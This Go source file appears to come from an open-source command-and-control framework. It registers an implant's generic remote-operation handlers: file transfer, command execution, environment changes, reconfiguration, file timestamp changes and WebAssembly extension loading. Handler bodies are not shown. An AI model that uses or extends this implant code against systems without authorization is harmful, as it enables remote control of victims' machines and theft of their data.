//go:build !(linux || darwin || windows)

package handlers

/*
	Leonidas C2 Framework
	Copyright (C) 2026  Leonidas C2 Project

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	----------------------------------------------------------------------

	This file contains only pure Go handlers, which can be compiled for any
	platform/arch.

*/

import (
	"os"

	"github.com/leonidas-c2/leonidas/protobuf/leonidaspb"
)

var (
	genericHandlers = map[uint32]RPCHandler{
		leonidaspb.MsgPing:               pingHandler,
		leonidaspb.MsgLsReq:              dirListHandler,
		leonidaspb.MsgDownloadReq:        downloadHandler,
		leonidaspb.MsgUploadReq:          uploadHandler,
		leonidaspb.MsgCdReq:              cdHandler,
		leonidaspb.MsgPwdReq:             pwdHandler,
		leonidaspb.MsgRmReq:              rmHandler,
		leonidaspb.MsgMkdirReq:           mkdirHandler,
		leonidaspb.MsgMvReq:              mvHandler,
		leonidaspb.MsgCpReq:              cpHandler,
		leonidaspb.MsgExecuteReq:         executeHandler,
		leonidaspb.MsgExecuteChildrenReq: executeChildrenHandler,
		leonidaspb.MsgSetEnvReq:          setEnvHandler,
		leonidaspb.MsgEnvReq:             getEnvHandler,
		leonidaspb.MsgUnsetEnvReq:        unsetEnvHandler,
		leonidaspb.MsgReconfigureReq:     reconfigureHandler,
		leonidaspb.MsgChtimesReq:         chtimesHandler,
		leonidaspb.MsgGrepReq:            grepHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		leonidaspb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		leonidaspb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		leonidaspb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
	}
)

// GetSystemHandlers - Returns a map of the generic handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return genericHandlers
}

// GetSystemPivotHandlers - Not supported
func GetSystemPivotHandlers() map[uint32]TunnelHandler {
	return map[uint32]TunnelHandler{}
}

// Stub
func getUid(fileInfo os.FileInfo) string {
	return ""
}

// Stub
func getGid(fileInfo os.FileInfo) string {
	return ""
}
